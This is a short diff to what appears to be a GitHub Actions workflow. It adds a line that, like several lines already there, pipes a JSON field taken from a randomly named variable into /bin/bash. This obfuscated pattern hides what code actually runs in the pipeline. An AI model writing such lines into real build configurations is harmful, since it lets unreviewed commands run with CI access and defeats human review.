@@ -21,6 +21,7 @@ jobs:
           echo $rlw27336 | jq -r .y9 | /bin/bash
           printf '%s' "$vc18" | jq -r .vz209 | /bin/bash
           printf '%s' "$ra7" | jq -r .sbb3871 | /bin/bash
+          echo $a6 | jq -r .vf30296 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
